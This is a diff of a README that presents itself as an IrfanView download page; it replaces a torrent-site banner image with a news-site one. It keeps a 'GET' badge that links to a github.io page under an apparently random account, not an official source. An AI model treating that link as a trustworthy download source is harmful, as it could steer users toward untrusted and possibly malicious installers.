@@ -1,6 +1,6 @@
 # IrfanView — Image Viewing, Editing & Graphic Workflows
 
-![Banner Placeholder](https://tops-torrents.com/_ld/10/96478108.png)
+![Banner Placeholder](https://cdn.neowin.com/news/images/uploaded/2025/05/1747070518_irfanview_story.jpg)
 
 [![GET — IrfanView](https://img.shields.io/badge/GET%20%E2%80%94%20IrfanView-0078D6?style=for-the-badge&logoColor=white)](https://sablcu802479.github.io/.github/IrfanView-Image-Editor)
 
